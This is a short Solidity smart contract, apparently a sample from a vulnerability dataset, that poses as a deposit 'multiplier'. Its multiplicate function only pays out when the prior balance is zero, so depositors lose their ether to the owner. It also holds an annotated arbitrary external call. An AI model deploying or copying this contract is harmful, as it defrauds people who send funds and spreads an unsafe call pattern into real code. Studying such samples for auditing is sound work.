pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public Owner = msg.sender;

    function() public payable {}

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);
        require(adr.call.value(msg.value)(data)); // check the return value of the external call
    }

    function multiplicate(address adr) public payable {
        require(msg.value >= this.balance);
        adr.transfer(this.balance + msg.value);
    }
}